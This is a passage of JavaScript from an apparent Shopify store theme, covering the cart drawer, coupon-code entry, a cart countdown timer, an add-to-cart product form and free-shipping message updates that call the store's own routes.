        const body = JSON.stringify({ note: e.target.value });
        fetch(`${routes.cart_update_url}`, {...fetchConfig(), ...{ body }});
      }, 300))
    }
  });
};

class CartDrawer extends HTMLElement {
  constructor() {
    super();
    this.addEventListener('keyup', (evt) => evt.code === 'Escape' && this.close());
    this.querySelector('#CartDrawer-Overlay').addEventListener('click', this.close.bind(this));
    this.setHeaderCartIconAccessibility();
  }

  setHeaderCartIconAccessibility() {
    const cartLink = document.querySelector('#cartLink');
    cartLink.setAttribute('role', 'button');
    cartLink.setAttribute('aria-haspopup', 'dialog');
    cartLink.addEventListener('click', (e) => {
      e.preventDefault();
      this.open(cartLink)
    });
    cartLink.addEventListener('keydown', (e) => {
      if (e.code.toUpperCase() === 'SPACE') {
        e.preventDefault();
        this.open(cartLink);
      }
    });
  }

  open(triggeredBy) {
    if (triggeredBy) this.setActiveElement(triggeredBy);
    const cartDrawerNote = this.querySelector('[id^="Details-"] summary');
    if (cartDrawerNote && !cartDrawerNote.hasAttribute('role')) this.setSummaryAccessibility(cartDrawerNote);
    // here the animation doesn't seem to always get triggered. A timeout seem to help
    setTimeout(() => {this.classList.add('active')});

    this.addEventListener('transitionend', () => {
      const containerToTrapFocusOn = this.classList.contains('is-empty') ? this.querySelector('.drawer__inner-empty') : document.getElementById('CartDrawer');
      const focusElement = this.querySelector('.drawer__inner') || this.querySelector('.drawer__close');
      trapFocus(containerToTrapFocusOn, focusElement);
    }, { once: true });

    document.body.classList.add('overflow-hidden');
    document.body.classList.remove('loading');
  }

  close() {
    this.classList.remove('active');
    removeTrapFocus(this.activeElement);
    document.body.classList.remove('overflow-hidden');
  }

  setSummaryAccessibility(cartDrawerNote) {
    cartDrawerNote.setAttribute('role', 'button');
    cartDrawerNote.setAttribute('aria-expanded', 'false');

    if(cartDrawerNote.nextElementSibling.getAttribute('id')) {
      cartDrawerNote.setAttribute('aria-controls', cartDrawerNote.nextElementSibling.id);
    }

    cartDrawerNote.addEventListener('click', (e) => {
      e.currentTarget.setAttribute('aria-expanded', !e.currentTarget.closest('details').hasAttribute('open'));
    });

    //cartDrawerNote.parentElement.addEventListener('keyup', onKeyUpEscape);
  }

  renderContents(parsedState) {
    this.querySelector('.drawer__inner').classList.contains('is-empty') && this.querySelector('.drawer__inner').classList.remove('is-empty');
    this.productId = parsedState.id;
    this.getSectionsToRender().forEach((section => {
      const sectionElement = section.selector ? document.querySelector(section.selector) : document.getElementById(section.id);
      sectionElement.innerHTML =
          this.getSectionInnerHTML(parsedState.sections[section.id], section.selector);
    }));

    setTimeout(() => {
      this.querySelector('#CartDrawer-Overlay').addEventListener('click', this.close.bind(this));
      this.open();
    });
  }
  getSectionInnerHTML(html, selector = '.shopify-section'){
    return new DOMParser().parseFromString(html, 'text/html').querySelector(selector).innerHTML;
  }
  getSectionsToRender() {
    return [
      {
        id: 'cart-drawer',
        selector: '#CartDrawer'
      }
    ];
  }
  getSectionDOM(html, selector = '.shopify-section') {
    return new DOMParser().parseFromString(html, 'text/html').querySelector(selector);
  }
  setActiveElement(element) {
    this.activeElement = element;
  }
}

customElements.define('cart-drawer', CartDrawer);

class CartDrawerItems extends CartItems {
  getSectionsToRender() {
    return [
      {
        id: 'CartDrawer',
        section: 'cart-drawer',
        selector: '.drawer__inner'
      }
    ];
  }
}
customElements.define('cart-drawer-items', CartDrawerItems);

class CouponCode extends HTMLElement {
  constructor() {
    super();
    if (localStorage.getItem('storedDiscount')){
      this.querySelector('input[name="discount"]').value = localStorage.getItem('storedDiscount');  
    }
    this.querySelector('[data-update-coupon]').addEventListener('click', (event) => {
      this.val = this.querySelector('input[name="discount"]').value;
      localStorage.setItem('storedDiscount', this.val);
      fetch(`/discount/${this.val}`).then((response) => response.text()).then((responseText) =>{

      });
      if (document.querySelector('#cartCoupon')){
        document.querySelector('#cartCoupon').classList.remove("active");
      }
    })
  }
}
customElements.define('coupon-code', CouponCode);

class CartOption extends HTMLElement {
  constructor() {
    super();
    this.querySelectorAll('.cftBtn').forEach((button) => button.addEventListener("click", function(e){
        e.preventDefault()
        var ftbk = this.hash.substr(1);
        $('.cftDraw.active').removeClass('active');
        document.getElementById(ftbk).classList.add("active");
    }));
    document.querySelectorAll('.saveBtn').forEach((button) => button.addEventListener("click", function(e){
        const box = document.querySelectorAll('.cftDraw');
        box.forEach(box => { box.classList.remove("active"); });
    }));
  }
}
customElements.define('cart-option', CartOption);

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            clearInterval(startTimer);
            document.querySelector('.cartCountdown').remove();
        }
    }, 1000);
}
window.onload = function(){
    if(document.querySelector('.cartCountdown')){
        var minutes = document.querySelector('.cartCountdown').getAttribute('data-countdown'),
            display = document.querySelector('#cartTime');
        startTimer(minutes, display);
    }
};

if (!customElements.get('product-form')) {
  customElements.define('product-form', class ProductForm extends HTMLElement {
    constructor() {
      super();

      this.form = this.querySelector('form');
      this.form.querySelector('[name=id]').disabled = false;
      this.form.addEventListener('submit', this.onSubmitHandler.bind(this));
      this.cart = document.querySelector('cart-drawer');
      this.submitButton = this.querySelector('[type="submit"]');
      if (document.querySelector('cart-drawer')) this.submitButton.setAttribute('aria-haspopup', 'dialog');
    }

    onSubmitHandler(evt) {
      evt.preventDefault();
      if (this.submitButton.getAttribute('aria-disabled') === 'true') return;

      this.handleErrorMessage();

      this.submitButton.setAttribute('aria-disabled', true);
      this.submitButton.classList.add('loading');
      this.querySelector('.loading-overlay__spinner').classList.remove('hidden');

      const config = fetchConfig('javascript');
      config.headers['X-Requested-With'] = 'XMLHttpRequest';
      delete config.headers['Content-Type'];

      const formData = new FormData(this.form);
      if (this.cart) {
        formData.append('sections', this.cart.getSectionsToRender().map((section) => section.id));
        formData.append('sections_url', window.location.pathname);
        this.cart.setActiveElement(document.activeElement);
      }
      config.body = formData;

      fetch(`${routes.cart_add_url}`, config)
        .then((response) => response.json())
        .then((response) => {
          if (response.status) {
            this.handleErrorMessage(response.description);

            const soldOutMessage = this.submitButton.querySelector('.sold-out-message');
            if (!soldOutMessage) return;
            this.submitButton.setAttribute('aria-disabled', true);
            this.submitButton.querySelector('span').classList.add('hidden');
            soldOutMessage.classList.remove('hidden');
            this.error = true;
            return;
          } else if (!this.cart) {
            window.location = window.routes.cart_url;
            return;
          }

          this.error = false;
          const quickAddModal = this.closest('quick-add-modal');
          if (quickAddModal) {
            document.body.addEventListener('modalClosed', () => {
              setTimeout(() => { this.cart.renderContents(response) });
            }, { once: true });
            quickAddModal.hide(true);
          } else {
            this.cart.renderContents(response);
          }
        })
        .catch((e) => {
          console.error(e);
        })
        .finally(() => {
          this.submitButton.classList.remove('loading');
          if (this.cart && this.cart.classList.contains('is-empty')) this.cart.classList.remove('is-empty');
          if (!this.error) this.submitButton.removeAttribute('aria-disabled');
          this.querySelector('.loading-overlay__spinner').classList.add('hidden');
          freeShippMsg();
        });
    }

    handleErrorMessage(errorMessage = false) {
      this.errorMessageWrapper = this.errorMessageWrapper || this.querySelector('.pform-error-wrap');
      if (!this.errorMessageWrapper) return;
      this.errorMessage = this.errorMessage || this.errorMessageWrapper.querySelector('.pform-error-msg');

      this.errorMessageWrapper.toggleAttribute('hidden', !errorMessage);

      if (errorMessage) {
        this.errorMessage.textContent = errorMessage;
      }
    }
  });
}
function freeShippMsg(){
    fetch(window.routes.url+'/?section_id=cart-template').then((response) => response.text()).then((responseText) => {
        const html = new DOMParser().parseFromString(responseText, 'text/html')
        const destination = document.querySelector('#CartCount');
        const source = html.querySelector('#cartItems');
        if (source && destination) destination.innerHTML = source.innerHTML;

        if (document.querySelector('.freeShipMsg')){
            const freeship = document.querySelector('.freeShipMsg');
            const shipsource = html.querySelector('.freeShipget');
            if (shipsource && freeship) freeship.innerHTML = shipsource.innerHTML;
            if (theme.mlcurrency){ currenciesChange(".freeShipMsg span.money"); }
        }
    });
}
freeShippMsg();
function shopreviews(){
    if ($('.spr-badge').length){
        SPR.registerCallbacks();
        SPR.initRatingHandler();
        SPR.initDomEls();
        SPR.loadProducts();
        SPR.loadBadges();
    }
}